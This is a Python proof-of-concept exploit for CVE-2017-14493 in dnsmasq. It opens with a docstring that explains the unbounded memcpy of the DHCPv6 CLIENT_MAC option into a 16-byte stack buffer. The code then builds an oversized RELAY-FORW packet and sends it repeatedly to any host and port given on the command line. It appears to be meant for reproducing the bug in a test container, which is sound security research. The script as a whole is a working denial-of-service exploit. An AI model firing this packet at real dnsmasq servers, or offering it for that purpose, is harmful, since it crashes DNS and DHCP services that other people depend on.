#!/usr/bin/env python3
"""
PoC for CVE-2017-14493 (dnsmasq < 2.78 DHCPv6 stack-based buffer overflow).

The bug lives in dhcp6_maybe_relay() in src/rfc3315.c. When dnsmasq parses a
DHCPv6 RELAY-FORW (msg type 12) message it looks for the RFC-6939
OPTION6_CLIENT_MAC option (code 79):

    state->mac_len = opt6_len(opt) - 2;
    memcpy(&state->mac[0], opt6_ptr(opt, 2), state->mac_len);

state->mac[] is a fixed 16-byte (DHCP_CHADDR_MAX) stack buffer and the copy is
unbounded, so a CLIENT_MAC option longer than 18 bytes smashes the stack frame.
Fixed in 2.78 (commit 3d4ff1b) by bailing when opt6_len(opt) - 2 > 16.

We build a RELAY-FORW packet:
    [0]      msg-type        = 12 (DHCP6RELAYFORW)
    [1]      hop-count       = 0
    [2:18]   link-address    = 16 bytes (anything; loopback here)
    [18:34]  peer-address    = 16 bytes
    [34:]    options         = a single OPTION6_CLIENT_MAC with a huge length

opt6_find(opts, end, 79, 3) requires the option to be >= 3 data bytes; we give
it ~256 so the memcpy overruns state->mac by ~238 bytes -> ASan stack-buffer-
overflow abort in dhcp6_maybe_relay.

Usage: poc_cve_2017_14493.py [host] [port]
  default host = ::1  (loopback - dnsmasq serves DHCPv6 on lo in-container)
  default port = 547
"""

import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "::1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 547

DHCP6RELAYFORW = 12
OPTION6_CLIENT_MAC = 79

# --- relay header (34 bytes) ---
msg = bytearray()
msg.append(DHCP6RELAYFORW)            # msg-type
msg.append(0x00)                      # hop-count
msg += b"\x00" * 16                   # link-address (16)
msg += b"\x00" * 16                   # peer-address (16)

# --- malicious OPTION6_CLIENT_MAC (code 79) ---
# DHCPv6 option = 2-byte code + 2-byte length + data.
# state->mac[] is 16 bytes; opt copies (len-2) bytes. Use 256 bytes of data so
# the copy is 254 bytes -> overruns the 16-byte stack buffer hard.
payload = b"\x41" * 256
opt = struct.pack(">HH", OPTION6_CLIENT_MAC, len(payload)) + payload
pkt = bytes(msg) + opt

print(f"[poc] target {host}:{port}, packet {len(pkt)} bytes, "
      f"CLIENT_MAC data = {len(payload)} bytes (overflow of {len(payload) - 2 - 16} past mac[16])")

s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.settimeout(3)
try:
    s.sendto(pkt, (host, port))
    print(f"[poc] sent RELAY-FORW to {host}:{port}")
except OSError as e:
    print(f"[poc] send error: {e}")
    sys.exit(1)

# Fire a couple more in case of DAD / timing, harmless if the first already crashed.
for _ in range(3):
    try:
        s.sendto(pkt, (host, port))
    except OSError:
        break

try:
    data, _ = s.recvfrom(4096)
    print(f"[poc] got {len(data)} bytes back (server still alive this round)")
except socket.timeout:
    print("[poc] no reply (dnsmasq likely crashed mid-processing)")
s.close()
